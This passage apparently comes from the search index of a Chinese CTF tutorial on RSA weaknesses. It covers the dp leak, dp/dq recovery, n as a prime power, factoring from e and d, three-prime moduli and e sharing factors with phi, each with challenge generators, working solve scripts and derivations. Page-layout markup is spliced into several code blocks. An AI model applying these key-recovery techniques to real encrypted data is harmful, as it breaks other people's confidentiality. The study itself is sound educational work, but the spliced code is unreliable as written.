14824267720565830614198366423536599666692078969408403530258418602151322644585576708517191288357418574410537646212589360867055238409644225020114747038342097744542022643037865665129552322573216047070677736725417436626920538199776045223182025555032687422098410274010072272948921387942284889428172227747124840681230287572405913777684484640035353309074356839921615363768839468380890923086904115913017609689750326299359077846457821010369130002914875100460359637094049091716624328545343429605828899486733904861746381542564902018804771429533804771098266001841458433664015729735822285137823715376774756745985491673136930276941\nc1= 15493359169301410074294742205843127951680374731395022149514872755993630629089162028408320207198994693027373636212060578272511287443597043280252256375148624563670499072871754643384189774533934405727733699679220914275088403183879336594241788249627810478123376166068327204499510069769671107400170031827409347799781818216854334998468909013183811525688284142974464445136216626020389073625379426889005557474784633107067037562364550927860932957239328403322326674852543731738932181913222422086087135017041465305467628933404091450876573447149054228726054585012570036091080257371923849834757954329673617514640675309941718326627\nc2= 1129639783725801764965293730716077563236066858849848417513754106728304324550964149779456929545632835403665303400567929779454798061338838786581070336886869145357696864488611518771125027534268787109010503430313447389460984683822032899389007646158783785728285343713347931494062199917243631366285764058939519090743602216977513724902021454418835574712871092514940757735723709297452463014431720040155161772629328937153713384012521957796438994675887733312827926502709695530933411909694455038223632075992122461473772324457706144526855909934434396846023332605403533525981854297958006877942800622448532300316434156727548355876\n\np=GCD(n1,n2) \nq1=n1//p \nq2=n2//p \ne=0x10001 \na=crt([c1,c2],[n1,n2]) \nd=inverse_mod(e,(p-1)*(q1-1)*(q2-1)) \nm=pow(int(a),d,p*q1*q2) \nprint(m)\nnb=int(m).bit_length()//8+1 \nprint(int(m).to_bytes(nb,'big')) \n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P12.dp%E6%B3%84%E9%9C%B2/","title":"P12.dp\u6cc4\u9732","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P12.dp%E6%B3%84%E9%9C%B2/#p12dp","title":"P12.dp\u6cc4\u9732","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P12.dp%E6%B3%84%E9%9C%B2/#_1","title":"\u51fa\u9898\u811a\u672c","text":"<pre><code>#coding:utf-8\nimport random\nimport base64\nimport hashlib\nimport string\nimport libnum\n\ndef put_flag():\n    # \u5b57\u7b26\u4e32\u5217\u8868\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 151 \u4e2a\u5b57 :fontawesome-solid-code: 67 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f\n&lt;/div&gt;\n    a = string.printable\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = r\"flag{%s}\"%(hashlib.md5(flag.encode()).hexdigest())\n    print(flag)\n    return flag\n\n#\u751f\u6210\u7d20\u6570\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne=65537\nn=p*q\nphi_n=(p-1)*(q-1)\nd=libnum.invmod(e,phi_n)\ndp=d%(p-1)\nm=put_flag()\nm=libnum.s2n(m)\nn=p*q\nc=pow(m,e,n)\n\nprint(\"n=\",n)\nprint(\"e=\",e)\nprint(\"dp=\",dp)\nprint(\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P12.dp%E6%B3%84%E9%9C%B2/#_2","title":"\u89e3\u5bc6\u811a\u672c","text":"<pre><code>#coding:utf-8\nimport libnum\nimport gmpy2\n\nn= 20591086052762884774007642208627186047740785982069905465339106113815517926005138245376424039890471346116595814990565096469487055161205492208983070664066759158320021466738870626889248859926445073065690645149662384802893003569214932187478720052507261122240086903309849212209649669687231860209185304367043990868365998317112708060029389114801978983457120555456044119368210749131216212628106714166030746209367457730301494656881326171842507368964603885018433049753989158109159264897704177466521001420986879635961230539498749382319333460275823384358292388617142535346744858436238862753394517975326105321275152062417195136487\ne= 65537\ndp= 117650567231513516304011449747630188369389787217757178598401487861414722594762697578263686709962979384903219013406107957537598898044022905612629709116256327804419610618227360381750844695360296505774931533979275522382118810562627585509057288685774693859111511668637640128536485929734825688725882979874153712289\nc= 11882214238703654387165659956294046561271974803426268099981312451686746219445527904685768634078193803230258145834800940089716687361084767393552437220859938746433048199198403178660887457673639116251966379227242789841204694915397745327702138343494160974011134668539019661693330405169786812935866677630175241506856985283075068700171501509407518847350856175791919328062950403163853767193784729690208750698852790441958574336390898190131490970318926320913093369651228634714453458106787439297347445279781184630937957106170862280836800221040231888465070504491616197979521787557062164298550636929825159364431658963099844517487\n\nfor i in range(1,65535):\n    p=(dp*e-1)//i+1\n    if n%p==0:\n        q=n//p\n        break\nprint(p)\nprint(q)\nphi_n= (p-1)*(q-1)\nd=gmpy2.invert(e,phi_n)\nm=pow(c,d,n)\nprint(m)\nflag=libnum.n2s(int(m)).decode()\nprint(flag)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P12.dp%E6%B3%84%E9%9C%B2/#_3","title":"\u9898\u76ee\u89e3\u6790","text":"<p>\u5df2\u77e5\u516c\u94a5n,e\u4ee5\u53cadp</p> <p>\u5176\u4e2d,dp = d mod (p-1) </p> <p>\u5df2\u77e5\uff1a</p> <pre><code>c = m^e mod n\nm = c^d mod n\n\u03d5(n)=(p\u22121)*(q\u22121)\nd\u2217e \u2261 1 mod \u03d5(n)\ndp = d mod (p\u22121)\n</code></pre> <p>\u7531\u4e0a\u5f0f\u53ef\u4ee5\u5f97\u5230</p> <pre><code>dp*e\u2261d*e mod (p\u22121)\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u5f97\u5230</p> <p><pre><code>\u5f0f1\uff1ad\u2217e=k\u2217(p\u22121)+dp\u2217e\n\u5f0f2\uff1ad\u2217e\u22611 mod \u03d5(n)\n</code></pre> \u5f0f1\u5e26\u5165\u5f0f2</p> <pre><code>=&gt; k\u2217(p\u22121)+dp\u2217e \u22611 mod \u03d5(n)\n\n=&gt; k\u2217(p\u22121)+dp\u2217e \u22611 mod (p\u22121)\u2217(q\u22121)\n\n=&gt; k1\u2217(p\u22121)+dp\u2217e = k2*(p\u22121)\u2217(q\u22121)+1\n\n=&gt; dp*e =  k2*(p\u22121)\u2217(q\u22121)+1-k1\u2217(p\u22121)+dp\u2217e\n\n=&gt; dp*e = (p-1)*[k2*(p-1)-k1]+1\n</code></pre> <p>\u56e0dp&lt;p\u22121\uff08dp\u662fd//\uff08p-1\uff09\u7684\u4f59\u6570\uff0cdp&lt;p\u22121\uff09</p> <p>\u6240\u4ee5e &gt; k2\u2217(q\u22121)\u2212k1</p> <p>\u5047\u8bbe x=k2\u2217(q\u22121)\u2212k1</p> <p>x\u7684\u8303\u56f4\u4e3a (0,e)</p> <p>x\u2217(p\u22121)+1=dp\u2217e</p> <p>\u6c42\u51fap-1\u65b9\u6cd5\uff0c\u904d\u5386(0,e)\u7684\u8303\u56f4\uff0c\u5176\u4e2d\u80af\u5b9a\u6709\u4e00\u4e2ap\u53ef\u4ee5\u88abn\u6574\u9664\uff0c\u90a3\u4e48\u6c42\u51fap\u548cq</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P13.%20dp%2Cdq/","title":"P13. dp,dq","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P13.%20dp%2Cdq/#p13dpdq","title":"P13.dp,dq","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P13.%20dp%2Cdq/#_1","title":"\u51fa\u9898\u811a\u672c","text":"<pre><code>#coding:utf-8\nimport random\nimport base64\nimport hashlib\nimport string\nimport libnum\n\ndef put_flag():\n    # \u5b57\u7b26\u4e32\u5217\u8868\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 392 \u4e2a\u5b57 :fontawesome-solid-code: 53 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f\n&lt;/div&gt;\n    a = string.printable\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = r\"flag{%s}\"%(hashlib.md5(flag.encode()).hexdigest())\n    print(flag)\n    return flag\n#\u751f\u6210\u7d20\u6570\np=libnum.generate_prime(1024)\nq=libnum.generate_prime(1024)\ne=65537\nn=p*q\nphi_n=(p-1)*(q-1)\nd=libnum.invmod(e,phi_n)\ndp=d%(p-1)\ndq=d%(q-1)\nm=put_flag()\nm=libnum.s2n(m)\nn=p*q\nc=pow(m,e,n)\n\nprint(\"p=\",p)\nprint(\"q=\",q)\nprint(\"dq=\",dq)\nprint(\"dp=\",dp)\nprint(\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P13.%20dp%2Cdq/#_2","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code># coding=utf-8\nimport gmpy2\nimport libnum\n\ndef decrypt(dp,dq,p,q,c):\n    InvQ = gmpy2.invert(q, p)\n    mp = pow(c, dp, p)\n    mq = pow(c, dq, q)\n    m = (((mp-mq)*InvQ) % p)*q+mq\n    print(libnum.n2s(int(m)).decode())\n\np= \nq= \ndq= \ndp= \nc= \n\ndecrypt(dp,dq,p,q,c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P13.%20dp%2Cdq/#_3","title":"\u9898\u76ee\u89e3\u6790","text":"<p><pre><code>c = m^e mod n\n\nm = c^d mod n\n\n\u03d5(n)= (p\u22121)\u2217(q\u22121)\n\nd\u2217e\u2261 1 mod \u03d5(n)\n\ndp= d mod (p\u22121)\n\ndq= d mod (q\u22121)\n</code></pre> \u9996\u5148\u6839\u636e</p> <pre><code>m=c^d mod n\n\ngcd(p,q)=1\nn=p\u2217q\n\n\u5229\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406,\u5f97\uff1a\nm1=c^d mod p\nm2=c^d mod q\n</code></pre> <pre><code>m=c^d mod n\nm=c^d+k\u2217n\n\nn=p\u2217q\nm=c^d+p\u2217q\u2217k\n\n\n\u540c\u65f6\u53d6\u4f59q\u548cp\n\nm1\u2261c^d mod q\nm2\u2261c^d mod p\n\nc^d=kp+m1\n\n\n\u5f0f1\u5e26\u5165\u5f0f2\nm2\u2261(kp+m1) mod q\n\n\u7b49\u5f0f\u4e24\u8fb9\u540c\u65f6\u51cf\u53bbm1,\n(m2\u2212m1)\u2261kp mod q\n\ngcd(p,q)=1\n\n\u6240\u4ee5\u53ef\u4ee5\u6c42p\u7684\u9006\u5143\uff0c\u5f97\u5230\n(m2\u2212m1)\u2217p1\u2261k mod q\n\n\u5f97\u5230\u5982\u4e0b\u4e24\u4e2a\u5f0f\u5b50\nk\u2261(m2\u2212m1)\u2217p1mod q\nc^d=kp+m1\nm\u2261c^d mod n\n\n\n\u4e0a\u4e0b\u4e24\u4e2a\u5f0f\u5b50\u5408\u5e76\n\nc^d = ((m2\u2212m1)\u2217p1 mod q)p+m1\nm \u2261 c^d mod n\n\n\u6700\u540e\u53ef\u4ee5\u6709\n\nm\u2261(((m2\u2212m1)\u2217p1 mod q)p+m1) mod n\n\n\u53ea\u5269\u6700\u540e\u4e00\u6b65\u4e86\n\nm1\u2261cd mod q\nm2\u2261cd mod p\n\nm1\u548cm2\u600e\u4e48\u6c42\n\nd\u2261dp mod (p\u22121)\nd\u2261dq mod (q\u22121)\n\n\u90a3\u4e48\u5206\u522b\u5e26\u5165\n\nm1\u2261cdq mod (q\u22121) mod q\nm2\u2261cdp mod (p\u22121) mod p\n\n\u8d39\u9a6c\u5c0f\u5b9a\u7406\u5373\u5047\u5982p\u662f\u8d28\u6570\uff0c\u4e14gcd(a,p)=1\na(p\u22121)\u22611 mod p\n\n\u6240\u4ee5\u5982\u679c\u6211\u4eec\u6709\u7b49\u5f0f\n\nd=dp+k\u2217(p\u22121)\n\n\u76f4\u63a5\u5e26\u5165\nm2\u2261c^dp+k\u2217(p\u22121) mod p\n\n\u8fd9\u91cc\u7684\u6307\u6570\uff0c\u6211\u4eec\u62c6\u5f00\uff0c\u4e3a\nm2\u2261c^dp\u2217ck\u2217(p\u22121) mod p\n\nck\u2217(p\u22121)\u22611 mod p\n\n\u56e0\u4e3ap\u662f\u5927\u7d20\u6570\uff0c\u663e\u7136\u548cc\u4e92\u7d20\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\nm2\u2261cdp mod p\n\n\u90a3\u4e48m1\u6839\u636e\u5bf9\u79f0\u6027\u4e5f\u53ef\u4ee5\u540c\u7406\u5f97\u5230\n\nm1\u2261cdq mod q\n\n\u6545\u6b64\uff0c\u6211\u4eec\u73b0\u5728\u62e5\u6709\u4e86\u6240\u6709\u6761\u4ef6\uff0c\u4e0b\u9762\u5f52\u7eb3\u4e00\u4e0b\u4e3a\n\nm1\u2261cdq mod q\nm2\u2261cdp mod p\nm\u2261(((m2\u2212m1)\u2217p1 mod q)p+m1) mod n\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/","title":"P14.n\u662fp\u7684r\u6b21\u65b9","text":"<p> \u7ea6 50 \u4e2a\u5b57  47 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#p14npr","title":"P14.n\u662fp\u7684r\u6b21\u65b9","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#ctf","title":"ctf\u4e2d\uff0c\u9047\u5230\u8fc7\u8fd9\u6837\u7684\u9898\u76ee\uff1a","text":"<pre><code>n = p^r \uff0cp\u4e3a\u7d20\u6570\uff0c\u6ca1\u6709q\u4e86\u3002\u56e0\u4e3ap=q\u3002\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#nn","title":"\u90a3\u4e48\u8ba1\u7b97n\u7684\u6b27\u62c9\u51fd\u6570\u03c6(n)\u5c31\u662f","text":"<pre><code>\u03c6(n)=p^r-p^{r-1}\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#_1","title":"\u63a8\u5bfc\u8fc7\u7a0b\u4e3a\uff1a","text":"<pre><code>\u6b27\u62c9\u51fd\u6570\u03c6(n)\u7684\u5b9a\u4e49\u662f\u5c0f\u4e8en\u7684\u81ea\u7136\u6570\u4e2d\u4e0en\u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\u3002\n\np^r \u8d28\u56e0\u6570\u5c31\u53ea\u6709p\uff0c\u90a3\u4e48\u4e0d\u4e0e\u5b83\u4e92\u8d28\u7684\u6570\u90fd\u542b\u6709p\uff0c\n\n\u548c\u5b83\u4e0d\u4e92\u8d28\u7684\u6570\u7684\u4e2a\u6570\uff1ap^r/p=p^r-1/p=p^{r-1} \n\n\u5269\u4e0b\u5c31\u662f\u4e92\u8d28\u7684\u6570\uff0c\u5176\u4e2a\u6570\u5c31\u662f\uff1ap^r-p^{r-1} \n\n\u5219\u6709 \u03c6(n)=p^r-p^{r-1}\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#_2","title":"\u51fa\u9898\u811a\u672c","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#_3","title":"\u9898\u76ee","text":"<pre><code>import libnum\n\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np=libnum.generate_prime(1024)\ne=65537\nm=\"flag{de8c3ea714f7f780185924d473997bcb}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nn=p**4\nphi_n=p**4-p**3\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\nc=pow(m,e,n)\n\nprint (\"n=\",n)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P14.n%E6%98%AFp%E7%9A%84r%E6%AC%A1%E6%96%B9/#_4","title":"\u89e3\u5bc6\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\n\nn= \ne= \nc= \n#\u5206\u89e3n\n#yafu-x64.exe  factor()\np= \nphi_n=p**4-p**3\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\nm=pow(c,d,n)\nprint(m)\n#\u6570\u5b57\u8f6c\u5b57\u8282\uff0c\u8f6c\u5b57\u7b26\u4e32\nprint(libnum.n2s(int(m)).decode())\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P15.%E5%B7%B2%E7%9F%A5e%20_d%20n%20%E6%B1%82p%20q/","title":"P15.\u5df2\u77e5e _d n \u6c42p q","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P15.%E5%B7%B2%E7%9F%A5e%20_d%20n%20%E6%B1%82p%20q/#p15e_d-n-p-q","title":"P15.\u5df2\u77e5e_d n \u6c42p q","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P15.%E5%B7%B2%E7%9F%A5e%20_d%20n%20%E6%B1%82p%20q/#ed-n-p-q","title":"\u5df2\u77e5e,d n \u6c42p q","text":"<pre><code># \u7ed9\u51fan,e,d, \u6c42 q,p\n&lt;div markdown=\"1\" style=\"margin-top: -30px; font-size: 0.75em; opacity: 0.7;\"&gt;\n:material-circle-edit-outline: \u7ea6 25 \u4e2a\u5b57 :fontawesome-solid-code: 106 \u884c\u4ee3\u7801 :material-clock-time-two-outline: \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f\n&lt;/div&gt;\nimport random\nimport gmpy2\n\n\ndef gcd(a, b):\n    if a &lt; b:\n        a, b = b, a\n    while b != 0:\n        temp = a % b\n        a = b\n        b = temp\n    return a\n\n\ndef getpq(n, e, d):\n    p = 1\n    q = 1\n    while p == 1 and q == 1:\n        k = d * e - 1\n        g = random.randint(0, n)\n        while p == 1 and q == 1 and k % 2 == 0:\n            k //= 2\n            y = pow(g, k, n)\n            if y != 1 and gmpy2.gcd(y - 1, n) &gt; 1:\n                p = gmpy2.gcd(y - 1, n)\n                q = n // p\n    return p, q\n\n\ndef main():\n    n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309\n    e = 65537\n    d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453\n    p, q = getpq(n, e, d)\n    print(p)\n    print(q)\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P15.%E5%B7%B2%E7%9F%A5e%20_d%20n%20%E6%B1%82p%20q/#e_d-n-p-q","title":"\u5df2\u77e5e_d n \u6c42p q","text":"<pre><code>#coding=utf-8\nfrom random import randint\nimport gmpy2\ndef oddR(r):\n    while r%2==0:\n        r=r//2\n    return r\n\ndef bits(b):\n    k=[]\n    while b:\n        if b%2!=0:\n            k.append(1)\n        else:\n            k.append(0)\n        b&gt;&gt;=1\n    k.reverse()      \n    return k\n\ndef quickmod(a,b,n):      #a^b mod n \u5feb\u901f\u5e42\u6a21n\u8fd0\u7b97\n    f=1\n    k=bits(b)\n    for i in range(len(k)):\n        f=(f*f)%n\n        if k[i]:\n            f=(f*a)%n\n    return f\n\ndef gcd(m,n):\n    while(n!=0):\n        m,n=n,m%n\n    return m\n\ndef func(e_d,N):\n    k=e_d-1            \n    r=oddR(k)           #\u6c42\u51fak=2^t*r\u4e2d\u7684r\n\n    while True:\n        b=randint(2,N-1)    #\u83b7\u53d6\u533a\u95f4(2,N-1)\u7684\u4e00\u4e2a\u968f\u673a\u6570\n        a=quickmod(b,r,N)   \n        if a==1:            \n            continue    \n        y=gcd(a-1,N)\n        if a&gt;1 and y&gt;1:    \n            q=N//y\n            return q\n        else:\n            r=r*2         \n\ndef deciphering(e_d,n):    \u3001\n    p=func(e_d,n)\n    q=n//p\n    phi=n-(p+q)+1\n    if p*q==n:\n        print p\n        print q\n    else:\n        print\"error\"\n\n\n\nn =  20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947\ne_d=  100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201\ndeciphering(e_d,n)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P16.N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/","title":"P16.N\u5206\u89e3\u4e09\u4e2a\u7d20\u6570","text":"<p> \u7ea6 36 \u4e2a\u5b57  50 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P16.N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/#p16n","title":"P16.N\u5206\u89e3\u4e09\u4e2a\u7d20\u6570","text":"<p>\u5bf9n\u8fdb\u884c\u5206\u89e3\uff0c\u5f97\u5230\u4e863\u4e2a\u7d20\u6570 n=p*q*r</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P16.N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/#flag","title":"\u968f\u673a\u751f\u6210flag","text":"<pre><code>import random\nimport hashlib\nimport string\n\n#\u5b57\u7b26\u4e32\u5217\u8868\na=string.printable\n#\u968f\u673a\u751f\u6210flag\nfor i in range(10):\n    flag = \"\"\n    for i in range(10):\n        flag += a[random.randint(0, 99)]\n    flag = hashlib.md5(flag.encode()).hexdigest()\n    print(\"flag{\" + flag + \"}\")\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P16.N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/#_1","title":"\u51fa\u9898\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\n#\u751f\u6210\u968f\u673a\u7d20\u6570\np=libnum.generate_prime(32)\nq=libnum.generate_prime(32)\nr=libnum.generate_prime(512)\ne=65537\nm=\"flag{20d6e2da95dcc1fa5f5432a436c4be18}\"\n#\u5b57\u7b26\u4e32\u8f6c\u6570\u5b57\nm=libnum.s2n(m)\nn=p*q*r\nphi_n=(p-1)*(q-1)*(r-1)\n#\u6c42\u9006\u5143\nd=libnum.invmod(e,phi_n)\nc=pow(m,e,n)\nprint (\"n=\",n)\nprint (\"e=\",e)\nprint (\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P16.N%E5%88%86%E8%A7%A3%E4%B8%89%E4%B8%AA%E7%B4%A0%E6%95%B0/#_2","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>import libnum\nimport gmpy2\n\n\nn=\ne= \nc= \n#\u5206\u89e3n\n#yafu-x64.exe  factor()\np= \nq = \nr = \n\nphi_n=(p-1)*(q-1)*(r-1)\nd=gmpy2.invert(e,phi_n)\nm=pow(c,d,n)\nprint(m)\nprint(libnum.n2s(int(m)))\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P17.e%E5%92%8Cphi_n%E4%B8%8D%E4%BA%92%E7%B4%A0/","title":"P17.e\u548cphi_n\u4e0d\u4e92\u7d20","text":"<p> \u7ea6 15 \u4e2a\u5b57  40 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P17.e%E5%92%8Cphi_n%E4%B8%8D%E4%BA%92%E7%B4%A0/#p18ephi_n","title":"P18.e\u548cphi_n\u4e0d\u4e92\u7d20","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P17.e%E5%92%8Cphi_n%E4%B8%8D%E4%BA%92%E7%B4%A0/#_1","title":"\u51fa\u9898\u811a\u672c","text":"<pre><code>import gmpy2\nimport libnum\nimport random\nimport uuid\nflag=\"flag{\"+str(uuid.uuid4())+\"}\"\nm=libnum.s2n(flag)\n\nwhile 1:\n    e = random.randint(100,1000)\n    p=libnum.generate_prime(1024)\n    q=libnum.generate_prime(1024)\n    phi_n=(p-1)*(q-1)\n    t=gmpy2.gcd(e,phi_n)\n    if  gmpy2.invert(e // t, phi_n) and t !=1:\n        break\nn=p*q\nc=pow(m,e,n)\nprint(\"p=\",p)\nprint(\"q=\",q)\nprint(\"e=\",e)\nprint(\"c=\",c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P17.e%E5%92%8Cphi_n%E4%B8%8D%E4%BA%92%E7%B4%A0/#_2","title":"\u89e3\u9898\u811a\u672c","text":"<pre><code>import gmpy2\nfrom Crypto.Util.number import *\n#\u5f53e\u7ea6\u53bb\u516c\u7ea6\u6570\u540e\u4e0ephi\u4e92\u7d20\ndef decrypt(p,q,e,c):\n    n=p*q\n    phi=(p-1)*(q-1)\n    t=gmpy2.gcd(e,phi)\n    d=gmpy2.invert(e//t,phi)\n    m=pow(c,d,n)\n    msg=gmpy2.iroot(m,t)\n    if msg[1]:\n        print(long_to_bytes(msg[0]))\np=149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527\nq=149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993\ne=180\nc=17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559\n\n\ndecrypt(p,q,e,c)\n</code></pre>"},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/","title":"P18.RSA\u5e38\u7528\u89e3\u5bc6\u4ee3\u7801\u5757\uff08\u7f51\u4e0a\u6536\u96c6\uff09","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E5%9D%97%EF%BC%88%E7%BD%91%E4%B8%8A%E6%94%B6%E9%9B%86%EF%BC%89/#p18rsa","title":"P18.RSA\u5e38\u7528\u89e3\u5bc6\u4ee3\u7801\u5757\uff08\u7f51\u4e0a\u6536\u96c6\uff09","text":""},{"location":"01RSA%E5%9F%BA%E7%A1%80%E7%AF%87/P18.RSA%E5